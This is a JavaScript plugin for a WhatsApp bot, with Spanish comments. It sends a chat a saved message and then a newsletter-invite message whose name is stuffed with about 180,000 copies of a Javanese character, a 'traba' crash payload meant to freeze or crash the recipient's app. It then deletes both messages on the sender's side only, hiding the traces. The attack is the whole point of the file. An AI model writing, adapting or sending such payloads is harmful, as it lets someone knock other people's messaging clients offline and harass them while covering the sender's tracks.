import fs from 'fs';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');

    const normalize = jid => jid.split('@')[0];
    if (normalize(m.sender) !== normalize(conn.user.jid)) {
      return m.reply('❌ Solo el número del bot puede usar este comando.');
    }

    if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return m.reply('❌ El archivo está dañado o incompleto.');

    // ✅ Enviar mensaje guardado usando copyNForward
    const enviado1 = await conn.copyNForward(m.chat, mensaje, true);

    // ✅ Eliminar localmente solo para el bot
    await conn.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: enviado1.key.id,
        participant: conn.user.id
      }
    });

    // 💣 Mensaje tipo canal
    const travas = 'ꦾ'.repeat(90000);
    const canalMessage = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const enviado2 = await conn.sendMessage(m.chat, canalMessage);

    await conn.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: enviado2.key.id,
        participant: conn.user.id
      }
    });

    await conn.sendMessage(m.chat, {
      text: '✅ Ambos mensajes fueron enviados y eliminados localmente solo para el bot.'
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['enviarmsg'];
export default handler;